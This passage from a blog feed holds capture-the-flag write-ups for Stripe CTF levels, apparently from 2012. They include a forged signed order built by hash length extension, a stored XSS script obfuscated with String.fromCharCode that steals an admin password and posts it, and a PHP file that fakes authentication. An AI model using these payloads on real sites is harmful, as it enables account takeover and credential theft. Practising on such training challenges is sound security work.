+'count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;amp;waffle=liege'
+base64:
+Y291bnQ9MTAmbGF0PTM3LjM1MSZ1c2VyX2lkPTEmbG9uZz0tMTE5LjgyNyZ3YWZmbGU9ZWdnb4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIoJndhZmZsZT1saWVnZQ==
+new sig: f7d4b492cc3282cd87e61624ee207ca496e807e4
+&lt;/pre&gt;
+&lt;p&gt;Now, we just have to make the order:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File forged_client.py&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;StringIO&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;order&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://localhost:9233&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&lt;/span&gt;&lt;span class="se"&gt;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02&lt;/span&gt;&lt;span class="s"&gt;(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;f7d4b492cc3282cd87e61624ee207ca496e807e4&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;|sig:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;
+
+    &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Curl&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/orders&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POSTFIELDS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WRITEFUNCTION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;perform&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getvalue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;order&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;pre class="literal-block"&gt;
+$ python forged_client.py
+{&amp;quot;confirm_code&amp;quot;: &amp;quot;dummy-password&amp;quot;, &amp;quot;message&amp;quot;: &amp;quot;Great news: 10 liege
+waffles will soon be flying your way!&amp;quot;, &amp;quot;success&amp;quot;: true}
+&lt;/pre&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #6</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-6.html" rel="alternate"></link><updated>2012-10-28T12:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-28:stripe-ctf-level-6.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level06-logo.jpg"&gt;&lt;img alt="level06-logo" src="/images/level06-logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/stripe-ctf-level06.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;This level is a message board: you can share updates with your
+friends. The only thing is, you can't put messages with quotes and
+double quotes, in order to prevent SQL injection. You also can't change
+your password, but don't worry, it's visible on your profile page. Can
+we use this to retrieve the admin's password?&lt;/p&gt;
+&lt;p&gt;This level is a lot like level #4. When you post a message, the
+server only checks for quotes and double quotes, not for script tags.
+So, we can post a message consisting of javascript code which will
+retrieve the password and post it on the board. But we can't use quotes
+or double quotes: we'll have to obfuscate our code. And since the
+admin's password contains quotes and double quotes, we'll have to
+obfuscate it as well before we post it to the board. I chose to use
+base64, and I found a javascript implementation
+&lt;a class="reference external" href="http://www.webtoolkit.info/javascript-base64.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+
+    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/user_info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;password_page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;responseText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;csrf_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;new_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;elements&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;_csrf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;title=password&amp;amp;body=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password_page&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;amp;_csrf=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+
+    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/posts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Connection&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;keep-alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We'll obfuscate it using String.fromCharCode (the following result
+contains also the base64 function):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;fromCharCode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[...]&lt;/span&gt; &lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;125&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;span class="c"&gt;&amp;lt;!-- The result is too big to be displayed entirely --&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Let's post this and wait for the admin to log in.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level06-form.png"&gt;&lt;img alt="level06-form" src="/images/level06-form.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Now, we check the source code, and we see some base64-encoded stuff.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level06-source.png"&gt;&lt;img alt="level06-source" src="/images/level06-source.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We just have to decode it.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level06-base64-decoded.png"&gt;&lt;img alt="level06-base64-decoded" src="/images/level06-base64-decoded.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We URL decode it, to clean a little bit:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level06-w00t.png"&gt;&lt;img alt="level06-w00t" src="/images/level06-w00t.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #5</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-5.html" rel="alternate"></link><updated>2012-10-27T23:31:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:stripe-ctf-level-5.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level05-logo.jpg"&gt;&lt;img alt="level05-logo" src="/images/level05-logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/stripe-ctf-level05.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;82b066cca46fd24a16959ada973d6df0d7c693f7791a8b673add276f324a5885&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;This level wants to solve a real problem: identification. We have too
+many online accounts and we have to remember usernames/passwords for
+everyone of them. It would be way simpler to be able to log into a new
+web service using your Google account, or your Facebook account (kind of
+like &lt;a class="reference external" href="https://en.wikipedia.org/wiki/OpenID"&gt;OpenID&lt;/a&gt;). That's what
+this level is all about.&lt;/p&gt;
+&lt;p&gt;This service asks for a pingback address (it's the service you want
+to use to identify, like using Google or Facebook with OpenID), and your
+username/password to this pingback. The form will then send your
+credentials to the pingback and see if you're successfully
+authenticated.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 20&lt;/span&gt;
+&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^level05-\d+\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
+&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# The pingback must follow this regex&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Note that these regex were for the real CTF. For a local usage, here are
+what they look like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 23&lt;/span&gt;
+&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^localhost$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
+&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;//&lt;/span&gt; &lt;span class="c1"&gt;# No restriction on the allowed hosts&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We can only use pingback URL ending in .stripe-ctf.com, but fortunately,
+we still have access to the social network on level #2! We can upload a
+PHP file, which will always say the authentication is successful.&lt;/p&gt;
+&lt;p&gt;Note: on the next screenshots, I'll use 127.0.0.1 as the address for
+level #2, and localhost as the address for level #5!&lt;/p&gt;
+&lt;p&gt;So, how does the service know that we were successfully authenticated to
+the pingback?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 109&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;authenticated?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="sr"&gt;/[^\w]AUTHENTICATED[^\w]*$/&lt;/span&gt;
+&lt;span class="k"&gt;end&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;So, all we have to do is upload the following file to level #2:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; AUTHENTICATED &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Let's fill the form to use &lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;
+as a pingback:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level05-first-form.png"&gt;&lt;img alt="level05-first-form" src="/images/level05-first-form.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We submit, and here are the result of the authentication...&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level05-first-login.png"&gt;&lt;img alt="level05-first-login" src="/images/level05-first-login.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;...and the new login page:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level05-first-authentication.png"&gt;&lt;img alt="level05-first-authentication" src="/images/level05-first-authentication.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Okay, now we can authenticate using this script, but we can't recover
+the password, cause the URL is
+&lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;, and not
+&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. The key is to see how the
+server recovers the pingback URL we give him:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 67&lt;/span&gt;
+&lt;span class="n"&gt;pingback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:pingback&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[...]&lt;/span&gt;
+&lt;span class="c1"&gt;# File srv.rb, line 80&lt;/span&gt;
+&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pingback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[...]&lt;/span&gt;
+&lt;span class="c1"&gt;# File srv.rb, line 99&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Sending request to &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;RestClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;
+
